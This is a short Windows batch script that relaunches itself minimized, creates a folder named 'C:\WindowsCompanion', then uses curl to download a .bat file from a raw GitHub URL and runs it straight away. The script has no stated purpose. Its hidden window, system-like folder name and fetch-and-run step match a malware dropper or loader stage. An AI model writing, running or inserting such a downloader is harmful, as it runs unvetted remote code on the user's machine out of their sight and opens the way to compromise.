@echo off

if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

    if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"
    
    set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
    
    set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat
    
    set DESTINATION_FOLDER=C:\WindowsCompanion
    
    curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"

exit
